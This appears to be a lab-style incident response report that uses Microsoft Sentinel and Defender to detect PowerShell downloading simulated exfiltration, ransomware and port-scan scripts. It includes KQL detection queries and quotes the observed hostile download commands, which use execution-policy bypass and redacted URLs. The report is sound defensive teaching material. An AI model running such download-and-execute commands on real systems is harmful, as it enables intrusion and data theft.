🛡️ Incident Response Report – Haider Naqvi

Scenario: PowerShell Suspicious Web RequestFramework: NIST 800-61 (Computer Security Incident Handling Lifecycle)

🛠️ Step 1: Preparation

- Microsoft Sentinel and Microsoft Defender for Endpoint (MDE) were configured for log forwarding.
- DeviceProcessEvents logs were actively collected and ingested into Sentinel.
- Alert rule designed to detect PowerShell-based downloads using Invoke-WebRequest.
- Training provided to analysts on recognizing post-exploitation behavior.

Use Case Summary:

Sometimes when a bad actor has access to a system, they will attempt to download malicious payloads or tools directly from the internet to expand their control or establish persistence. This is often achieved using legitimate system utilities like PowerShell to blend in with normal activity. By leveraging commands such as Invoke-WebRequest, they can download files or scripts from an external server and immediately execute them, bypassing traditional defenses or detection mechanisms. This tactic is a hallmark of post-exploitation activity, enabling them to deploy malware, exfiltrate data, or establish communication channels with a command-and-control (C2) server. Detecting this behavior is critical to identifying and disrupting an ongoing attack.

🔍 Step 2: Detection and Analysis

Analytics Rule Configuration:

Rule Name: Haider - PowerShell Suspicious Web Request
Description: Detects usage of PowerShell to download files from the internet.
Severity: Medium
Run Frequency: Every 4 hours
Lookup Period: Last 24 hours
Entity Mapping:
- Account: AccountName
- Host: DeviceName
- Process: ProcessCommandLine
Incident Creation: Enabled
Group all alerts in one incident per 24 hours: Enabled
Stop query after alert: Enabled

🔹 Alert Rule KQL Query

let TargetHostname = "windows-target-1";
DeviceProcessEvents
| where DeviceName == TargetHostname
| where FileName == "powershell.exe"
| where InitiatingProcessCommandLine contains "Invoke-WebRequest"
| order by TimeGenerated

📃 Observed PowerShell Commands:

powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri 'https://.../exfiltratedata.ps1' -OutFile 'C:\programdata\exfiltratedata.ps1'
powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri 'https://.../eicar.ps1' -OutFile 'C:\programdata\eicar.ps1'
powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri 'https://.../pwncrypt.ps1' -OutFile 'C:\programdata\pwncrypt.ps1'
powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri 'https://.../portscan.ps1' -OutFile 'C:\programdata\portscan.ps1'

Simulated User Statement:

The user stated they tried to install a free utility and a black screen appeared briefly.

📊 Confirming Script Execution

let TargetHostname = "windows-target-1";
let ScriptNames = dynamic(["eicar.ps1", "exfiltratedata.ps1", "portscan.ps1", "pwncrypt.ps1"]);
DeviceProcessEvents
| where DeviceName == TargetHostname
| where FileName == "powershell.exe"
| where ProcessCommandLine contains "-File" and ProcessCommandLine has_any (ScriptNames)
| order by TimeGenerated
| project TimeGenerated, AccountName, DeviceName, FileName, ProcessCommandLine

🧬 Reverse Engineering Summary

- exfiltratedata.ps1 → Attempts to send files to external destination.
- eicar.ps1 → EICAR test file to trigger AV detection.
- pwncrypt.ps1 → Encrypts local files (simulated ransomware).
- portscan.ps1 → Scans network for open ports.

🛡️ Step 3: Containment, Eradication, and Recovery

Actions Taken:

- Isolated the affected VM using Microsoft Defender for Endpoint.
- Ran a full anti-malware scan.
- Verified no persistence mechanisms or lateral movement.
- Removed from isolation and restored to operational state.

Execution Findings:

- exfiltratedata.ps1 and portscan.ps1 were executed by local user account.
- exfiltratedata.ps1 attempted data transfer.
- portscan.ps1 performed local port scanning.

📓 Step 4: Post-Incident Activities

Lessons Learned:

- Affected user enrolled in enhanced cybersecurity awareness training.
- KnowBe4 training program frequency increased.
- Policy implemented to restrict PowerShell usage to admin users only.
- Updated Sentinel detection logic to reduce false positives and enhance script-based detection.

Incident Closure:

- Incident marked as "True Positive".
- Documentation completed.
- Case closed within Microsoft Sentinel.

🔗 MITRE ATT&CK Mapping

Technique ID

Name

Description

T1059.001

PowerShell

Execution of downloaded scripts using PowerShell

T1105

Ingress Tool Transfer

Tools/scripts downloaded from remote locations

T1071.001

Web Protocols

Use of HTTP/HTTPS for communication/download

T1562.001

Impair Defenses

Bypassing PowerShell execution policy
